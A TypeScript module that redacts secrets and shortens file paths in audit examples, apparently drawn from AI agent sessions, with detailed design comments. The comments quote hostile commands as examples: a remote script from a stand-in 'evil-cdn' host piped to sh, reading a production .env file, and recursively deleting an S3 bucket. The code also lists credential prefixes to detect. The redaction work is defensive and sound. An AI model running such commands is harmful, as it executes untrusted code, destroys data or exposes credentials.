/**
 * What an audit example looks like by the time it is allowed to leave the box.
 *
 * The audit keeps up to three 80-character examples per policy, and they are
 * slices of REAL commands and paths — `cat /home/sidd/work/acme/.env.production`,
 * `aws s3 rm s3://prod-bucket --recursive`. Naming what happened is the whole
 * value of the digest, and those strings are also the only thing in the report
 * that could carry something a person would mind sending.
 *
 * Three transforms, in this order, and the order matters:
 *
 *  1. **Secrets are masked**, against `SECRET_PATTERNS` — the same list the
 *     `sanitize-*` policies block on. One definition of "secret", used for both
 *     blocking and redacting, rather than a second pattern list beside it that
 *     eventually disagrees. A second pass then catches a secret that arrived
 *     ALREADY CUT: the audit truncates examples to 80 characters at capture
 *     time, so a command ending in a credential reaches this module with the
 *     credential's tail missing and the full pattern no longer matching. See
 *     `maskTruncatedSecret`.
 *  2. **Assigned secrets are masked** — `DATABASE_PASSWORD=hunter2`,
 *     `https://user:pass@host`, `curl -u user:pass`. These are shapes the
 *     BLOCKING patterns deliberately do not carry, because a name-based rule
 *     that denies a tool call would misfire on ordinary work. Redaction only
 *     removes characters, so it can afford the wider net. See
 *     `maskAssignedSecrets`.
 *  3. **Home paths are shortened**, so `/home/sidd/work/acme/src/db.ts` becomes
 *     `~/…/db.ts`. The basename is what makes a finding recognisable; the
 *     directory chain is a map of someone's disk and their employer's project
 *     names.
 *
 * Masking runs FIRST because shortening can cut a path mid-token, and a secret
 * embedded in a path (`.../ghp_xxxxx/...`) sliced in half stops matching its own
 * pattern and ships as a fragment.
 *
 * ## What this is not
 *
 * It is not a guarantee. Pattern-based redaction misses formats it has never
 * seen, and the honest framing is that this reduces exposure rather than
 * eliminating it — which is exactly why the digest carries counts and titles as
 * its substance and treats examples as colour. If the tradeoff ever stops being
 * worth it, `redactExample` is the one place to change.
 */
import { homedir } from "node:os";

import { SECRET_PATTERNS } from "../hooks/builtin-policies";

/** Longest example we let through, after redaction. */
export const REDACTED_EXAMPLE_MAX_CHARS = 160;

/**
 * Path segments kept before the basename when shortening.
 *
 * Zero. `~/…/db.ts` says "somewhere under home" and names the file, which is
 * what makes a finding recognisable to the person who caused it. One segment
 * would routinely be the project — usually a client or employer name, and the
 * single most identifying token on the line.
 */
const KEPT_PARENT_SEGMENTS = 0;

/** Matches an absolute POSIX-ish path with at least two segments. */
const ABSOLUTE_PATH_RE = /(?:\/[\w.\-@+]+){2,}\/?/g;

/**
 * Roots whose paths are left intact.
 *
 * These are kernel and device paths — the same on every machine, identifying
 * nobody, and shortening them actively costs readability: a real digest came
 * back with `2>/…/null`, which reads as though something was hidden when
 * nothing was. Everything else is shortened, including paths outside home,
 * because "not under home" is not the same as "safe to send".
 */
const PUBLIC_PATH_ROOTS = ["/dev/", "/proc/", "/sys/"];

/**
 * Prefixes that BEGIN a secret, for catching one that arrives already cut.
 *
 * The audit truncates every example to 80 characters at capture time, long
 * before this module sees it — so a command ending in a credential arrives with
 * the credential's tail already gone, and the full patterns in
 * `SECRET_PATTERNS` no longer match it. A real digest came back containing
 * `authorization: Bearer s`, which is the first character of a live token.
 *
 * One character is not a usable secret. The point is that the number is set by
 * where the truncation happened to land rather than by anything here, and the
 * same shape with a longer prefix ships more. So a known prefix sitting at the
 * END of the string — with nothing after it, or too little to have matched — is
 * masked on the assumption it was cut, which costs a few characters of context
 * in the rare case it was not.
 *
 * Each prefix is guarded by `(?<!\w)` so it only fires at a token boundary.
 * Without it `sk-` matched INSIDE ordinary words — `kubectl get pods -n
 * risk-scoring` redacted to `… -n ri[REDACTED: OpenAI API key]`, which both
 * invents a credential the digest then reports and destroys the one token that
 * said which command ran. `task-`, `disk-` and `desk-` did the same.
 */
const SECRET_PREFIXES: ReadonlyArray<readonly [RegExp, string]> = [
  [/(?<!\w)(?:Authorization:\s*)?Bearer\s+\S*$/i, "bearer token"],
  [/(?<!\w)sk-ant-\S*$/, "Anthropic API key"],
  [/(?<!\w)sk-proj-\S*$/, "OpenAI project API key"],
  [/(?<!\w)sk-\S*$/, "OpenAI API key"],
  [/(?<!\w)ghp_\S*$/, "GitHub personal access token"],
  [/(?<!\w)github_pat_\S*$/, "GitHub fine-grained token"],
  [/(?<!\w)AKIA\S*$/, "AWS access key ID"],
  [/(?<!\w)sk_live_\S*$/, "Stripe live secret key"],
  [/(?<!\w)sk_test_\S*$/, "Stripe test secret key"],
  [/(?<!\w)AIza\S*$/, "Google API key"],
  [/-----BEGIN\s[A-Z ]*$/, "private key"],
];

/**
 * Mask a secret that was cut short before it reached us.
 *
 * Runs AFTER `maskSecrets`, so a complete secret is already gone and this only
 * ever sees a genuine fragment. Anchored to the end of the string, because a
 * prefix in the MIDDLE with text after it was not truncated — it either matched
 * a full pattern already or was never a secret.
 */
export function maskTruncatedSecret(input: string): string {
  for (const [pattern, label] of SECRET_PREFIXES) {
    if (pattern.test(input)) {
      return input.replace(pattern, `[REDACTED: ${label}]`);
    }
  }
  return input;
}

/**
 * Identifier fragments that make an assignment's VALUE a secret.
 *
 * Two lists, because the words differ in how much they mean on their own.
 * `TOKEN`, `SECRET` and `PASSWORD` name a credential wherever they appear in an
 * identifier, including the camelCase `_authToken` that `npm config set`
 * writes. `KEY`, `PASS`, `AUTH`, `PAT` and `SIG` are also fragments of ordinary
 * words — `MONKEY_COUNT`, `PASSENGERS`, `AUTHOR`, `PATH`, `SIGNAL` — so they
 * only count as a whole `_`-delimited component.
 */
const SECRET_NAME_SUBSTRINGS = [
  "TOKEN",
  "SECRET",
  "PASSWORD",
  "PASSWD",
  "CREDENTIAL",
  "APIKEY",
  "PRIVATEKEY",
];
const SECRET_NAME_COMPONENTS = ["KEY", "PASS", "AUTH", "PAT", "SIG", "SIGNATURE", "SESSION", "COOKIE"];

/**
 * `NAME=value`, with the value quoted or running to the next shell separator.
 *
 * The unquoted alternative excludes quotes as well as separators: a value that
 * runs to end-of-token inside an already-quoted string (`"…?sig=deadbeef"`)
 * would otherwise swallow the closing quote and leave the line unbalanced.
 */
const ASSIGNMENT_RE = /\b([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|[^\s;|&"']+)/g;

/** Credentials inline in a URL, on ANY scheme — `https://user:pass@host`. */
const URL_CREDENTIALS_RE = /([a-z][a-z0-9+.\-]*:\/\/)[^\s/:@]+:[^\s/@]+@/gi;

/** `curl -u user:pass`, in both spellings and both separators. */
const BASIC_AUTH_FLAG_RE = /((?:^|\s)(?:-u|--user)[\s=])\S+:\S+/g;

/** True when an identifier's name says its value is a credential. */
export function isSecretName(name: string): boolean {
  const upper = name.toUpperCase();
  if (SECRET_NAME_SUBSTRINGS.some((word) => upper.includes(word))) return true;
  return upper.split("_").some((part) => SECRET_NAME_COMPONENTS.includes(part));
}

/**
 * Mask secrets whose shape is an ASSIGNMENT rather than a known vendor prefix.
 *
 * This is the one class the blocking patterns deliberately do not cover, and
 * the gap mattered because `protect-env-vars` is in the digest's harmful set
 * (`harm-report.ts`) and its dominant trigger is `export VAR=…` — so the
 * example is the whole command, value included. `SECRET_PATTERNS` matches nine
 * vendor-prefixed key formats, a JWT, a literal `Authorization: Bearer` and a
 * fixed non-HTTP scheme list; none of them matches
 * `export DATABASE_PASSWORD=hunter2-prod-acme`, and `export` is ubiquitous in
 * agent sessions. Every one of those shipped verbatim.
 *
 * These patterns live HERE rather than in `SECRET_PATTERNS` on purpose, and it
 * is not the "second list that eventually disagrees" this module warns about.
 * The two jobs have opposite error costs: the `sanitize-*` policies BLOCK a
 * tool call, so a false positive there is a denial of work the user wanted, and
 * a name-based rule would deny `export EDITOR=vim` on a machine with
 * `PASSTHROUGH` in the environment. Redaction only removes characters from a
 * digest, so it can afford to be generous, and being generous is the point. The
 * shared list stays the floor; this is the redactor spending its extra margin.
 *
 * The NAME is kept and only the value is masked — `DATABASE_PASSWORD=[REDACTED:
 * assigned secret]` still tells the reader which credential was exposed, which
 * is the actionable half of the finding.
 */
export function maskAssignedSecrets(input: string): string {
  let out = input.replace(ASSIGNMENT_RE, (match, name: string, value: string) => {
    if (!isSecretName(name)) return match;
    // An earlier pass already named this one, and it named it better.
    // `export ANTHROPIC_API_KEY=sk-ant-…` is masked by the vendor pattern as
    // "Anthropic API key"; re-masking it here would downgrade that to the
    // generic label and strip the marker's own tail as it went.
    if (value.startsWith("[REDACTED")) return match;
    return `${name}=[REDACTED: assigned secret]`;
  });
  out = out.replace(URL_CREDENTIALS_RE, "$1[REDACTED: URL credentials]@");
  out = out.replace(BASIC_AUTH_FLAG_RE, "$1[REDACTED: basic auth]");
  return out;
}

/**
 * Mask anything matching a known secret shape.
 *
 * A fresh `RegExp` is built per pattern per call rather than reusing the shared
 * literal with the `g` flag added: a global regex carries `lastIndex` across
 * calls, so a shared instance would skip matches in the next string depending on
 * where it stopped in the previous one — a bug that only appears once there is
 * more than one example, and looks like flakiness rather than logic.
 */
export function maskSecrets(input: string): string {
  let out = input;
  for (const [pattern, label] of SECRET_PATTERNS) {
    const global = new RegExp(pattern.source, pattern.flags.includes("g") ? pattern.flags : `${pattern.flags}g`);
    out = out.replace(global, `[REDACTED: ${label}]`);
  }
  return out;
}

/**
 * Replace absolute paths with `~/…/<basename>`.
 *
 * The home directory is resolved rather than assumed, and a path outside it is
 * shortened too — `/etc/…/shadow`, `/var/…/secrets.yml` — because "not under
 * home" is not the same as "safe to send", and a build agent's checkout lives
 * under `/build` as often as anywhere.
 */
export function shortenPaths(input: string, home = homedir()): string {
  // Normalised ONCE, not per match: `startsWith` against a home carrying a
  // trailing slash fails for the home directory itself (`/home/u` does not start
  // with `/home/u/`), which silently turned off home detection for the one path
  // that most needed it.
  const homeRoot = home.replace(/\/+$/, "");
  return input.replace(ABSOLUTE_PATH_RE, (match, offset: number, whole: string) => {
    // Kernel/device paths are the same on every machine and identify nobody.
    if (PUBLIC_PATH_ROOTS.some((root) => match.startsWith(root))) return match;

    // A URL's HOST is not a directory, and it was being deleted as one.
    //
    // `curl https://evil-cdn.example.com/install.sh | sh` came out as
    // `curl https:/…/install.sh` — the domain is the entire security decision
    // in a `block-curl-pipe-sh` finding, and it was the one token removed. The
    // match begins at the second slash of `://`, so the scheme is checked
    // behind it and the host kept while the path is still shortened.
    if (offset > 0 && whole[offset - 1] === "/" && /[a-z][a-z0-9+.\-]*:$/i.test(whole.slice(0, offset - 1))) {
      const urlSegments = match.split("/").filter(Boolean);
      if (urlSegments.length <= 1) return match;
      const host = urlSegments[0];
      const leaf = urlSegments[urlSegments.length - 1];
      const elided = urlSegments.length > 2 ? "/…" : "";
      return `/${host}${elided}/${leaf}${match.endsWith("/") ? "/" : ""}`;
    }
    const trailingSlash = match.endsWith("/");
    const segments = match.split("/").filter(Boolean);
    if (segments.length === 0) return match;
    const basename = segments[segments.length - 1];
    const kept = segments.slice(
      Math.max(0, segments.length - 1 - KEPT_PARENT_SEGMENTS),
      segments.length - 1,
    );
    // `/home/u2` starts with `/home/u` as a string and is a different directory,
    // so the boundary is checked rather than the prefix alone.
    const matchRoot = match.replace(/\/+$/, "");
    const underHome =
      homeRoot.length > 0 && (matchRoot === homeRoot || matchRoot.startsWith(`${homeRoot}/`));

    // The home directory ITSELF is `~`, and nothing more.
    //
    // Without this, `/home/sidd` shortened to `~/…/sidd` — the username kept as
    // the basename, immediately after the `~` whose entire job is to stand in
    // for it. The one path guaranteed to name a person was the one the redactor
    // spelled out, and it shipped to the server and into the digest. `~/` for a
    // trailing slash, so `cd /home/sidd/` still reads as a directory.
    if (matchRoot === homeRoot && homeRoot.length > 0) {
      return trailingSlash ? "~/" : "~";
    }
    const root = underHome ? "~" : "";
    // `…` rather than `...` so the elision cannot be mistaken for a relative
    // path component, and reads as one glyph in a monospace digest.
    const middle = segments.length - kept.length - 1 > 0 ? "/…" : "";
    const tail = [...kept, basename].join("/");
    return `${root}${middle}/${tail}${trailingSlash ? "/" : ""}`;
  });
}

/**
 * Full pipeline: mask, shorten, collapse whitespace, cap.
 *
 * Whitespace is collapsed because a heredoc or a multi-line command reaches the
 * digest as one row, and a raw newline there breaks the plain-text layout while
 * saying nothing the single line does not.
 */
export function redactExample(input: string, home = homedir()): string {
  // Assignment masking runs LAST of the three, so the two pattern-based passes
  // get first refusal on anything they can name precisely. A vendor prefix
  // yields "[REDACTED: Anthropic API key]"; falling through to this one would
  // have said only "assigned secret", which is true but less useful to read.
  const masked = maskAssignedSecrets(maskTruncatedSecret(maskSecrets(input)));
  const shortened = shortenPaths(masked, home);
  const collapsed = shortened.replace(/\s+/g, " ").trim();
  return collapsed.length > REDACTED_EXAMPLE_MAX_CHARS
    ? `${collapsed.slice(0, REDACTED_EXAMPLE_MAX_CHARS - 1)}…`
    : collapsed;
}
